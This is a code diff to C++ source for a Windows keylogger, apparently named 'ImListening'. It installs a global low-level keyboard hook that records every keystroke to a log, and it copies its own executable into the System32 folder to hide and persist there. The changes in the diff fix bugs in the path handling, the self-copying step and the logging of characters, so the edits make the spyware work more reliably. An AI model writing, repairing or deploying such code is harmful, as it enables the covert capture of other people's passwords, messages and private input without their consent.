@@ -3,6 +3,8 @@
 #include <windows.h>
 #include <string>
 
+#define FILENAME "ImListening.exe"
+
 using namespace std;
 
 HHOOK hKeyHook;
@@ -11,9 +13,6 @@ KBDLLHOOKSTRUCT kbdStruct;
 BYTE keyState[256];
 WCHAR buffer[16];
 
-char systemPath[MAX_PATH];
-char pathtofile[MAX_PATH];
-
 HMODULE GetModH = GetModuleHandle(NULL);
 
 
@@ -21,10 +20,8 @@ HMODULE GetModH = GetModuleHandle(NULL);
 string getExePath(){
 	char buffer[MAX_PATH];
 	GetModuleFileName(NULL, buffer, MAX_PATH);
-	string::size_type pos = string(buffer).find_last_of( "\\/" );
-	return string(buffer).substr(0, pos);
+	return string(buffer);
 }
-
 
 //function that triggers on keypress
 LRESULT WINAPI KeyEvent(int nCode, WPARAM wParam, LPARAM lParam){
@@ -97,7 +94,7 @@ LRESULT WINAPI KeyEvent(int nCode, WPARAM wParam, LPARAM lParam){
 			default:
 				GetKeyboardState((PBYTE) &keyState);
 				ToUnicode(kbdStruct.vkCode, kbdStruct.scanCode, (PBYTE) &keyState, (LPWSTR) &buffer, sizeof(buffer) / 2, 0);
-				LOG << buffer[0];
+				LOG << (char) buffer[0];
 			break;
 		}
 		
@@ -135,23 +132,21 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine,
 	//hook keyboard
 	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyEvent, GetModuleHandle(NULL), 0);
 	
-	MSG message;
-	
-	//get file name, file path and system path
-	GetModuleFileName(GetModH, pathtofile, sizeof(pathtofile));
-	GetSystemDirectory(systemPath, sizeof(systemPath));
-	const char *exePath = getExePath().c_str();
-	
+	//get file path and system path
+	string exePath = getExePath();
+	string systemPath = string(getenv("SYSTEMROOT")) + "\\System32\\" + FILENAME;
 	cout << "checking...\nexePath: " << exePath <<"\nsystemPath: " << systemPath << endl;
 	
 	//if file not in system path, copy itself into it
-	if(strcmp(systemPath, exePath) != 0){
-		strcat(systemPath, "\\ImListening.exe");
-		CopyFile(pathtofile, systemPath, false);
-		cout << "moved to: " << systemPath << "\nfrom: " << pathtofile << endl;
+	if(exePath != systemPath){
+		if(!CopyFile(exePath.c_str(), systemPath.c_str(), FALSE))
+			cout << "copy failed: error " << GetLastError() << endl;
+		else
+			cout << "moved from " << exePath << " to " << systemPath << endl;
 	}
 	
 	//start capturing keys
+	MSG message;
 	while(GetMessage(&message, NULL, 0, 0)){
 		TranslateMessage(&message);
 		DispatchMessage(&message);
